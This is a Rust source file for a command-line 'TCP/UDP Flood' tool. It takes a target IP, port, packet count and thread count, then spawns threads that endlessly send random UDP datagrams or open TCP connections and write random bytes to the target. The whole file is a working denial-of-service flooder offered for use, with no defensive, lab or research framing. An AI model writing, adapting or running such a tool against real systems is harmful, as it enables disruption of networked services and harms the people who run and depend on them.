use clap::{App, Arg};
use rand::prelude::SliceRandom;
use std::io::Write;
use std::net::{SocketAddr, TcpStream, UdpSocket};
use std::thread;

fn main() {
    let matches = App::new("TCP/UDP Flood")
        .arg(
            Arg::with_name("ip")
                .short("i")
                .long("ip")
                .takes_value(true)
                .required(true)
                .help("Host ip"),
        )
        .arg(
            Arg::with_name("port")
                .short("p")
                .long("port")
                .takes_value(true)
                .required(true)
                .help("Port"),
        )
        .arg(
            Arg::with_name("choice")
                .short("c")
                .long("choice")
                .takes_value(true)
                .default_value("y")
                .help("UDP(y/n)"),
        )
        .arg(
            Arg::with_name("times")
                .short("t")
                .long("times")
                .takes_value(true)
                .default_value("50000")
                .help("Packets per one connection"),
        )
        .arg(
            Arg::with_name("threads")
                .short("d")
                .long("threads")
                .takes_value(true)
                .default_value("5")
                .help("Threads"),
        )
        .get_matches();

    let ip = matches.value_of("ip").unwrap();
    let port: u16 = matches.value_of("port").unwrap().parse().unwrap();
    let choice = matches.value_of("choice").unwrap();
    let times: usize = matches.value_of("times").unwrap().parse().unwrap();
    let threads: usize = matches.value_of("threads").unwrap().parse().unwrap();

    println!("#-- TCP/UDP FLOOD --#");

    for _ in 0..threads {
        if choice == "y" {
            let ip = ip.to_string();
            thread::spawn(move || run(ip, port, times));
        } else {
            let ip = ip.to_string();
            thread::spawn(move || run2(ip, port, times));
        }
    }

    // Prevent main thread from exiting
    loop {
        thread::park();
    }
}

fn run(ip: String, port: u16, times: usize) {
    let data: Vec<u8> = (0..1024).map(|_| rand::random::<u8>()).collect();
    let mut rng = rand::thread_rng();
    let i = ["[*]", "[!]", "[#]"].choose(&mut rng).unwrap();
    let addr = format!("{}:{}", ip, port).parse::<SocketAddr>().unwrap();

    loop {
        match UdpSocket::bind("0.0.0.0:0") {
            Ok(socket) => {
                for _ in 0..times {
                    let _ = socket.send_to(&data, &addr);
                }
                println!("{} Sent!!!", i);
            }
            Err(_) => {
                println!("[!] Error!!!");
            }
        }
    }
}

fn run2(ip: String, port: u16, times: usize) {
    let data: Vec<u8> = (0..16).map(|_| rand::random::<u8>()).collect();
    let mut rng = rand::thread_rng();
    let i = ["[*]", "[!]", "[#]"].choose(&mut rng).unwrap();
    let addr = format!("{}:{}", ip, port);

    loop {
        match TcpStream::connect(&addr) {
            Ok(mut stream) => {
                let _ = stream.write_all(&data);
                for _ in 0..times {
                    let _ = stream.write_all(&data);
                }
                println!("{} Sent!!!", i);
            }
            Err(_) => {
                println!("[*] Error");
            }
        }
    }
}
